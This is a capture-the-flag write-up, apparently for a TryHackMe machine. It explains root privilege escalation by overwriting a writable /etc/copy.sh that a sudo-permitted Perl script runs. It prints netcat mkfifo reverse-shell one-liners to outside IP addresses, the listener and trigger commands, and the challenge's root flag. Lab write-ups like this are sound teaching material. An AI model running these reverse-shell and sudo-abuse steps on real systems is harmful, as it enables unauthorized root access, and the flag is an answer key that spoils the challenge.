# Privilege Esc via Sudo Misconfiguration and Writable Script Abuse

## Enumeration

```bash
www-data@THM-Chal:/home/itguy$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

The `www-data` user can execute `backup.pl` as root without providing a password.

## Script Analysis

Inspect the Perl script:

```bash
www-data@THM-Chal:/home/itguy$ cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

The Perl script executes `/etc/copy.sh` using `sh`.

Inspect the shell script:

```bash
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

This script contains a reverse shell payload using Netcat.

## Vulnerability

Two issues lead to privilege escalation:

1. `www-data` can execute `/usr/bin/perl /home/itguy/backup.pl` as root via sudo.
2. `/etc/copy.sh` is writable by `www-data`.

Because `backup.pl` runs `/etc/copy.sh` as root, modifying `copy.sh` allows arbitrary command execution as root.

## Exploitation

Verify permissions:

```bash
ls -la /etc/copy.sh
```

Overwrite the reverse shell payload with a listener you control:

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.158.240 5555 >/tmp/f' > /etc/copy.sh
```

Start a Netcat listener on the attacking machine:

```bash
nc -lvnp 5555
```

Trigger execution as root:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

## Root Access

Successful reverse shell:

```bash
root@THM-Chal:/var/www/html/content/attachment# cd /root
root@THM-Chal:~# ls
root.txt
root@THM-Chal:~# cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```